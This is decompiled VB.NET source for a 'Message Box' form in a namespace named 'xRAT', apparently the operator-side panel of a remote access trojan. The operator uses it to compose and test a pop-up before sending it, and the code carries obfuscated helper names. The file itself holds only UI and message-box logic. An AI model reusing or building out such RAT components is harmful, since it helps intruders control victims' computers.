Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class MSG
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.MSG_Load)
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.MESSAGEBOX(Conversions.ToString(Me._TEXT), Conversions.ToString(Me._TITLE), Conversions.ToInteger(Me._STYLE), Conversions.ToInteger(Me._BUTTON))
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.DialogResult = DialogResult.OK
            Me.Close
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(MSG))
            Me.TextBox1 = New TextBox
            Me.TextBox2 = New TextBox
            Me.RadioButton1 = New RadioButton
            Me.RadioButton2 = New RadioButton
            Me.RadioButton3 = New RadioButton
            Me.RadioButton5 = New RadioButton
            Me.RadioButton6 = New RadioButton
            Me.RadioButton7 = New RadioButton
            Me.RadioButton8 = New RadioButton
            Me.Button1 = New Button
            Me.Button2 = New Button
            Me.GroupBox1 = New GroupBox
            Me.GroupBox2 = New GroupBox
            Me.PictureBox4 = New PictureBox
            Me.PictureBox3 = New PictureBox
            Me.PictureBox2 = New PictureBox
            Me.PictureBox1 = New PictureBox
            Me.RadioButton4 = New RadioButton
            Me.GroupBox1.SuspendLayout
            Me.GroupBox2.SuspendLayout
            DirectCast(Me.PictureBox4, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox3, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox2, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Dim point As New Point(15, &H57)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            Dim size As New Size(&H15D, &H15)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 2
            Me.TextBox1.Text = "Title"
            point = New Point(15, &H72)
            Me.TextBox2.Location = point
            Me.TextBox2.Multiline = True
            Me.TextBox2.Name = "TextBox2"
            size = New Size(&H15D, &H44)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = 3
            Me.TextBox2.Text = "Message."
            Me.RadioButton1.AutoSize = True
            Me.RadioButton1.Checked = True
            point = New Point(&H2A, &H3A)
            Me.RadioButton1.Location = point
            Me.RadioButton1.Name = "RadioButton1"
            size = New Size(14, 13)
            Me.RadioButton1.Size = size
            Me.RadioButton1.TabIndex = 4
            Me.RadioButton1.TabStop = True
            Me.RadioButton1.UseVisualStyleBackColor = True
            Me.RadioButton2.AutoSize = True
            point = New Point(&H7C, &H3A)
            Me.RadioButton2.Location = point
            Me.RadioButton2.Name = "RadioButton2"
            size = New Size(14, 13)
            Me.RadioButton2.Size = size
            Me.RadioButton2.TabIndex = 5
            Me.RadioButton2.TabStop = True
            Me.RadioButton2.UseVisualStyleBackColor = True
            Me.RadioButton3.AutoSize = True
            point = New Point(&H121, &H3A)
            Me.RadioButton3.Location = point
            Me.RadioButton3.Name = "RadioButton3"
            size = New Size(14, 13)
            Me.RadioButton3.Size = size
            Me.RadioButton3.TabIndex = 6
            Me.RadioButton3.TabStop = True
            Me.RadioButton3.UseVisualStyleBackColor = True
            Me.RadioButton5.AutoSize = True
            Me.RadioButton5.Checked = True
            point = New Point(10, &H16)
            Me.RadioButton5.Location = point
            Me.RadioButton5.Name = "RadioButton5"
            size = New Size(&H26, &H11)
            Me.RadioButton5.Size = size
            Me.RadioButton5.TabIndex = 8
            Me.RadioButton5.TabStop = True
            Me.RadioButton5.Text = "Ok"
            Me.RadioButton5.UseVisualStyleBackColor = True
            Me.RadioButton6.AutoSize = True
            point = New Point(&H36, &H17)
            Me.RadioButton6.Location = point
            Me.RadioButton6.Name = "RadioButton6"
            size = New Size(80, &H11)
            Me.RadioButton6.Size = size
            Me.RadioButton6.TabIndex = 9
            Me.RadioButton6.TabStop = True
            Me.RadioButton6.Text = "Ok / Cancel"
            Me.RadioButton6.UseVisualStyleBackColor = True
            Me.RadioButton7.AutoSize = True
            point = New Point(140, &H17)
            Me.RadioButton7.Location = point
            Me.RadioButton7.Name = "RadioButton7"
            size = New Size(&H41, &H11)
            Me.RadioButton7.Size = size
            Me.RadioButton7.TabIndex = 10
            Me.RadioButton7.TabStop = True
            Me.RadioButton7.Text = "Yes / No"
            Me.RadioButton7.UseVisualStyleBackColor = True
            Me.RadioButton8.AutoSize = True
            point = New Point(&HD4, &H17)
            Me.RadioButton8.Location = point
            Me.RadioButton8.Name = "RadioButton8"
            size = New Size(&H83, &H11)
            Me.RadioButton8.Size = size
            Me.RadioButton8.TabIndex = 11
            Me.RadioButton8.TabStop = True
            Me.RadioButton8.Text = "Abort / Retry / Ignore"
            Me.RadioButton8.UseVisualStyleBackColor = True
            point = New Point(15, &HFE)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H15D, &H1C)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 12
            Me.Button1.Text = ":: Test ::"
            Me.Button1.UseVisualStyleBackColor = True
            point = New Point(15, &H11D)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(&H15D, &H1C)
            Me.Button2.Size = size
            Me.Button2.TabIndex = 13
            Me.Button2.Text = ":: Send ::"
            Me.Button2.UseVisualStyleBackColor = True
            Me.GroupBox1.Controls.Add(Me.RadioButton5)
            Me.GroupBox1.Controls.Add(Me.RadioButton6)
            Me.GroupBox1.Controls.Add(Me.RadioButton8)
            Me.GroupBox1.Controls.Add(Me.RadioButton7)
            point = New Point(15, &HBC)
            Me.GroupBox1.Location = point
            Me.GroupBox1.Name = "GroupBox1"
            size = New Size(&H15D, 60)
            Me.GroupBox1.Size = size
            Me.GroupBox1.TabIndex = 14
            Me.GroupBox1.TabStop = False
            Me.GroupBox1.Text = "Button"
            Me.GroupBox2.Controls.Add(Me.PictureBox4)
            Me.GroupBox2.Controls.Add(Me.PictureBox3)
            Me.GroupBox2.Controls.Add(Me.PictureBox2)
            Me.GroupBox2.Controls.Add(Me.PictureBox1)
            Me.GroupBox2.Controls.Add(Me.RadioButton1)
            Me.GroupBox2.Controls.Add(Me.RadioButton2)
            Me.GroupBox2.Controls.Add(Me.RadioButton4)
            Me.GroupBox2.Controls.Add(Me.RadioButton3)
            point = New Point(15, 1)
            Me.GroupBox2.Location = point
            Me.GroupBox2.Name = "GroupBox2"
            size = New Size(&H15D, 80)
            Me.GroupBox2.Size = size
            Me.GroupBox2.TabIndex = 15
            Me.GroupBox2.TabStop = False
            Me.GroupBox2.Text = "Style"
            Me.PictureBox4.Image = DirectCast(manager.GetObject("PictureBox4.Image"), Image)
            point = New Point(&H112, &H10)
            Me.PictureBox4.Location = point
            Me.PictureBox4.Name = "PictureBox4"
            size = New Size(&H2D, &H29)
            Me.PictureBox4.Size = size
            Me.PictureBox4.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox4.TabIndex = 11
            Me.PictureBox4.TabStop = False
            Me.PictureBox3.Image = Class5.smethod_33
            point = New Point(&HBF, &H10)
            Me.PictureBox3.Location = point
            Me.PictureBox3.Name = "PictureBox3"
            size = New Size(&H2D, &H29)
            Me.PictureBox3.Size = size
            Me.PictureBox3.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox3.TabIndex = 10
            Me.PictureBox3.TabStop = False
            Me.PictureBox2.Image = Class5.smethod_84
            point = New Point(&H6C, &H10)
            Me.PictureBox2.Location = point
            Me.PictureBox2.Name = "PictureBox2"
            size = New Size(&H2D, &H29)
            Me.PictureBox2.Size = size
            Me.PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox2.TabIndex = 9
            Me.PictureBox2.TabStop = False
            Me.PictureBox1.Image = DirectCast(manager.GetObject("PictureBox1.Image"), Image)
            point = New Point(&H1B, &H10)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            size = New Size(&H2D, &H29)
            Me.PictureBox1.Size = size
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox1.TabIndex = 8
            Me.PictureBox1.TabStop = False
            Me.RadioButton4.AutoSize = True
            point = New Point(&HD0, &H3A)
            Me.RadioButton4.Location = point
            Me.RadioButton4.Name = "RadioButton4"
            size = New Size(14, 13)
            Me.RadioButton4.Size = size
            Me.RadioButton4.TabIndex = 7
            Me.RadioButton4.TabStop = True
            Me.RadioButton4.UseVisualStyleBackColor = True
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H177, &H148)
            Me.ClientSize = size
            Me.Controls.Add(Me.Button2)
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.TextBox2)
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.GroupBox1)
            Me.Controls.Add(Me.GroupBox2)
            Me.FormBorderStyle = FormBorderStyle.Fixed3D
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "MSG"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "Message Box"
            Me.GroupBox1.ResumeLayout(False)
            Me.GroupBox1.PerformLayout
            Me.GroupBox2.ResumeLayout(False)
            Me.GroupBox2.PerformLayout
            DirectCast(Me.PictureBox4, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox3, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox2, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Public Sub MESSAGEBOX(ByVal [text] As String, ByVal title As String, ByVal style As Integer, ByVal button As Integer)
            Select Case style
                Case 1
                    Select Case button
                        Case 1
                            Interaction.MsgBox([text], MsgBoxStyle.Information, title)
                            Return
                        Case 2
                            Interaction.MsgBox([text], (MsgBoxStyle.Information Or MsgBoxStyle.OkCancel), title)
                            Return
                        Case 3
                            Interaction.MsgBox([text], (MsgBoxStyle.Information Or MsgBoxStyle.YesNo), title)
                            Return
                        Case 4
                            Interaction.MsgBox([text], (MsgBoxStyle.Information Or MsgBoxStyle.AbortRetryIgnore), title)
                            Return
                    End Select
                    Exit Select
                Case 2
                    Select Case button
                        Case 1
                            Interaction.MsgBox([text], MsgBoxStyle.Critical, title)
                            Return
                        Case 2
                            Interaction.MsgBox([text], (MsgBoxStyle.Critical Or MsgBoxStyle.OkCancel), title)
                            Return
                        Case 3
                            Interaction.MsgBox([text], (MsgBoxStyle.Critical Or MsgBoxStyle.YesNo), title)
                            Return
                        Case 4
                            Interaction.MsgBox([text], (MsgBoxStyle.Critical Or MsgBoxStyle.AbortRetryIgnore), title)
                            Return
                    End Select
                    Exit Select
                Case 3
                    Select Case button
                        Case 1
                            Interaction.MsgBox([text], MsgBoxStyle.Exclamation, title)
                            Return
                        Case 2
                            Interaction.MsgBox([text], (MsgBoxStyle.Exclamation Or MsgBoxStyle.OkCancel), title)
                            Return
                        Case 3
                            Interaction.MsgBox([text], (MsgBoxStyle.Exclamation Or MsgBoxStyle.YesNo), title)
                            Return
                        Case 4
                            Interaction.MsgBox([text], (MsgBoxStyle.Exclamation Or MsgBoxStyle.AbortRetryIgnore), title)
                            Return
                    End Select
                    Exit Select
                Case 4
                    Select Case button
                        Case 1
                            Interaction.MsgBox([text], MsgBoxStyle.Question, title)
                            Return
                        Case 2
                            Interaction.MsgBox([text], (MsgBoxStyle.Question Or MsgBoxStyle.OkCancel), title)
                            Return
                        Case 3
                            Interaction.MsgBox([text], (MsgBoxStyle.Question Or MsgBoxStyle.YesNo), title)
                            Return
                        Case 4
                            Interaction.MsgBox([text], (MsgBoxStyle.Question Or MsgBoxStyle.AbortRetryIgnore), title)
                            Return
                    End Select
                    Exit Select
            End Select
        End Sub

        Private Sub MSG_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.int_0 = 1
            Me.int_1 = 1
        End Sub

        Private Sub RadioButton1_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton1.Checked Then
                Me.int_0 = 1
            End If
        End Sub

        Private Sub RadioButton2_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton2.Checked Then
                Me.int_0 = 2
            End If
        End Sub

        Private Sub RadioButton3_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton3.Checked Then
                Me.int_0 = 3
            End If
        End Sub

        Private Sub RadioButton4_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton4.Checked Then
                Me.int_0 = 4
            End If
        End Sub

        Private Sub RadioButton5_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton5.Checked Then
                Me.int_1 = 1
            End If
        End Sub

        Private Sub RadioButton6_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton6.Checked Then
                Me.int_1 = 2
            End If
        End Sub

        Private Sub RadioButton7_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton7.Checked Then
                Me.int_1 = 3
            End If
        End Sub

        Private Sub RadioButton8_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton8.Checked Then
                Me.int_1 = 4
            End If
        End Sub


        ' Properties
        Public ReadOnly Property _BUTTON As Object
            Get
                Return Me.int_1
            End Get
        End Property

        Public ReadOnly Property _STYLE As Object
            Get
                Return Me.int_0
            End Get
        End Property

        Public ReadOnly Property _TEXT As Object
            Get
                Return Me.TextBox2.Text
            End Get
        End Property

        Public ReadOnly Property _TITLE As Object
            Get
                Return Me.TextBox1.Text
            End Get
        End Property

        Friend Overridable Property Button1 As Button
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = value
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button2 As Button
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = value
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property GroupBox1 As GroupBox
            Get
                Return Me._GroupBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox1 = value
            End Set
        End Property

        Friend Overridable Property GroupBox2 As GroupBox
            Get
                Return Me._GroupBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As GroupBox)
                Me._GroupBox2 = value
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

        Friend Overridable Property PictureBox2 As PictureBox
            Get
                Return Me._PictureBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox2 = value
            End Set
        End Property

        Friend Overridable Property PictureBox3 As PictureBox
            Get
                Return Me._PictureBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox3 = value
            End Set
        End Property

        Friend Overridable Property PictureBox4 As PictureBox
            Get
                Return Me._PictureBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox4 = value
            End Set
        End Property

        Friend Overridable Property RadioButton1 As RadioButton
            Get
                Return Me._RadioButton1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton1_CheckedChanged)
                If (Not Me._RadioButton1 Is Nothing) Then
                    RemoveHandler Me._RadioButton1.CheckedChanged, handler
                End If
                Me._RadioButton1 = value
                If (Not Me._RadioButton1 Is Nothing) Then
                    AddHandler Me._RadioButton1.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton2 As RadioButton
            Get
                Return Me._RadioButton2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton2_CheckedChanged)
                If (Not Me._RadioButton2 Is Nothing) Then
                    RemoveHandler Me._RadioButton2.CheckedChanged, handler
                End If
                Me._RadioButton2 = value
                If (Not Me._RadioButton2 Is Nothing) Then
                    AddHandler Me._RadioButton2.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton3 As RadioButton
            Get
                Return Me._RadioButton3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton3_CheckedChanged)
                If (Not Me._RadioButton3 Is Nothing) Then
                    RemoveHandler Me._RadioButton3.CheckedChanged, handler
                End If
                Me._RadioButton3 = value
                If (Not Me._RadioButton3 Is Nothing) Then
                    AddHandler Me._RadioButton3.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton4 As RadioButton
            Get
                Return Me._RadioButton4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton4_CheckedChanged)
                If (Not Me._RadioButton4 Is Nothing) Then
                    RemoveHandler Me._RadioButton4.CheckedChanged, handler
                End If
                Me._RadioButton4 = value
                If (Not Me._RadioButton4 Is Nothing) Then
                    AddHandler Me._RadioButton4.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton5 As RadioButton
            Get
                Return Me._RadioButton5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton5_CheckedChanged)
                If (Not Me._RadioButton5 Is Nothing) Then
                    RemoveHandler Me._RadioButton5.CheckedChanged, handler
                End If
                Me._RadioButton5 = value
                If (Not Me._RadioButton5 Is Nothing) Then
                    AddHandler Me._RadioButton5.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton6 As RadioButton
            Get
                Return Me._RadioButton6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton6_CheckedChanged)
                If (Not Me._RadioButton6 Is Nothing) Then
                    RemoveHandler Me._RadioButton6.CheckedChanged, handler
                End If
                Me._RadioButton6 = value
                If (Not Me._RadioButton6 Is Nothing) Then
                    AddHandler Me._RadioButton6.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton7 As RadioButton
            Get
                Return Me._RadioButton7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton7_CheckedChanged)
                If (Not Me._RadioButton7 Is Nothing) Then
                    RemoveHandler Me._RadioButton7.CheckedChanged, handler
                End If
                Me._RadioButton7 = value
                If (Not Me._RadioButton7 Is Nothing) Then
                    AddHandler Me._RadioButton7.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton8 As RadioButton
            Get
                Return Me._RadioButton8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RadioButton8_CheckedChanged)
                If (Not Me._RadioButton8 Is Nothing) Then
                    RemoveHandler Me._RadioButton8.CheckedChanged, handler
                End If
                Me._RadioButton8 = value
                If (Not Me._RadioButton8 Is Nothing) Then
                    AddHandler Me._RadioButton8.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox2 = value
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("GroupBox1")> _
        Private _GroupBox1 As GroupBox
        <AccessedThroughProperty("GroupBox2")> _
        Private _GroupBox2 As GroupBox
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("PictureBox2")> _
        Private _PictureBox2 As PictureBox
        <AccessedThroughProperty("PictureBox3")> _
        Private _PictureBox3 As PictureBox
        <AccessedThroughProperty("PictureBox4")> _
        Private _PictureBox4 As PictureBox
        <AccessedThroughProperty("RadioButton1")> _
        Private _RadioButton1 As RadioButton
        <AccessedThroughProperty("RadioButton2")> _
        Private _RadioButton2 As RadioButton
        <AccessedThroughProperty("RadioButton3")> _
        Private _RadioButton3 As RadioButton
        <AccessedThroughProperty("RadioButton4")> _
        Private _RadioButton4 As RadioButton
        <AccessedThroughProperty("RadioButton5")> _
        Private _RadioButton5 As RadioButton
        <AccessedThroughProperty("RadioButton6")> _
        Private _RadioButton6 As RadioButton
        <AccessedThroughProperty("RadioButton7")> _
        Private _RadioButton7 As RadioButton
        <AccessedThroughProperty("RadioButton8")> _
        Private _RadioButton8 As RadioButton
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        Private icontainer_0 As IContainer
        Private int_0 As Integer
        Private int_1 As Integer
    End Class
End Namespace

